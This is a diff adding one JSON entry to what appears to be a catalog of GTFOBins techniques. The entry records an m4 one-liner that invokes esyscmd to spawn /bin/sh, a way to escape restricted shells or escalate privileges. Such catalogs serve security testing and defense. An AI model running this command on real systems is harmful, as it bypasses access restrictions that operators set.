@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-m4-shell",
+  "name": "GTFOBins · m4 (shell)",
+  "command": "echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4",
+  "description": "Use m4 to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "m4",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/m4/#shell",
+  "upstream_id": "m4/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/m4/"
+    }
+  ]
+}
